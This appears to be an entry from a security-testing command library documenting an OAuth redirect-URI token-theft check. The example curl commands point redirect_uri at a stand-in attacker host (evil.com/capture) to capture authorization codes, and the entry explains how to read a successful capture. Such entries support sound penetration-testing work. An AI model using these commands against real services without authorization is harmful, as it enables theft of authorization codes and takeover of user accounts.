---
type: command
executor: bash
data: >-
  curl
  "https://www.example.com/admin/oauth/authorize?client_id=$_CLIENT_ID&scope=$_SCOPE&redirect_uri=$_MALICIOUS_URI&response_type=code&state=$_STATE"
output: null
platforms:
  - Web
tags:
  - oauth
  - token-theft
verified: true
validated: true
---

# curl-oauth-authorize-malicious-redirect

## Command

```bash
curl "https://www.example.com/admin/oauth/authorize?client_id=$_CLIENT_ID&scope=$_SCOPE&redirect_uri=$_MALICIOUS_URI&response_type=code&state=$_STATE"
```

## Description

This command initiates an OAuth authorization request with a tampered redirect_uri to test for token theft vulnerabilities. It sends a GET request to the /authorize endpoint, mimicking a legitimate client but redirecting responses to an attacker-controlled URI.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_CLIENT_ID | The OAuth client ID for the application | Yes |
| $_SCOPE | Requested permissions (e.g., 'openid email') | Yes |
| $_MALICIOUS_URI | Attacker's logging endpoint (e.g., 'https://evil.com/capture') | Yes |
| $_STATE | CSRF protection state parameter (random string) | No |

## Examples

### Basic Usage

```bash
curl "https://www.example.com/admin/oauth/authorize?client_id=myapp&scope=openid&redirect_uri=https://evil.com/capture&response_type=code"
```

### Advanced Usage

```bash
curl "https://www.example.com/admin/oauth/authorize?client_id=myapp&scope=openid profile&redirect_uri=https://evil.com/capture&response_type=code&state=abc123"
```

## Expected Output

A 302 redirect or HTML consent page. Success is a redirect to $_MALICIOUS_URI with ?code=AUTH_CODE appended, indicating the vulnerability. Example: HTTP/1.1 302 Found\nLocation: https://evil.com/capture?code=abc123&state=xyz

## Related

- [[procedures/OAuth-Token-Theft-via-Redirect-URI]]
